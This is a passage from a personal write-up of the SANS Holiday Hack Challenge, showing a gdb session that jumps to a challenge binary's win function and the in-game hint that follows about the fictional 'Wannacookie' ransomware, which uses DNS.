[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.

Temporary breakpoint 1, 0x00005555555554ce in main ()
(gdb) jump winnerwinner      
Continuing at 0x555555554fdb.


                                                     .....          ......      
                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
     ...................,',,:lxkkkkkkkkkkkkkd.                                  
     ..........................';;:coxkkkkk:                                    
        ...............................ckd.                                     
          ...............................                                       
                ...........................                                     
                   .......................                                      
                              ....... ...                                       

With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.
[Inferior 1 (process 62) exited normally]
</code></pre>

<blockquote>
<p>Sweet candy goodness - I win! Thank you so much!
Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie?
Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted.
Many elves were affected, so Alabaster went to go see if he could help out.
I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer.
An elf I follow online said he analyzed Wannacookie and that it communicates over DNS.
He also said that Wannacookie transfers files over DNS and that it looks like it grabs a public key this way.
Another recent ransomware made it possible to retrieve crypto keys from memory. Hopefully the same is true for Wannacookie!
Of course, this all depends how the key was encrypted and managed in memory. Proper public key encryption requires a private key to decrypt.
Perhaps there is a flaw in the wannacookie author's DNS server that we can manipulate to retrieve what we need.
If so, we can retrieve our keys from memory, decrypt the key, and then decrypt our ransomed files.</p>
<p>- Shinny Upatree</p>
</blockquote>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../main/" title="Main Objectives" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Main Objectives
              </span>
            </div>
          </a>
        
        
          <a href="../appendices/" title="Appendices" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Appendices
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
        
  <div class="md-footer-social">
    <link rel="stylesheet" href="../assets/fonts/font-awesome.css">
    
      <a href="https://github.com/bernardsmith0892/" class="md-footer-social__link fa fa-github"></a>
    
      <a href="https://twitter.com/BernardSmith892" class="md-footer-social__link fa fa-twitter"></a>
    
      <a href="https://www.linkedin.com/in/bernard-smith-27324257/" class="md-footer-social__link fa fa-linkedin"></a>
    
  </div>

      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/application.b41f3d20.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
      
    
    
      
    
  </body>
</html>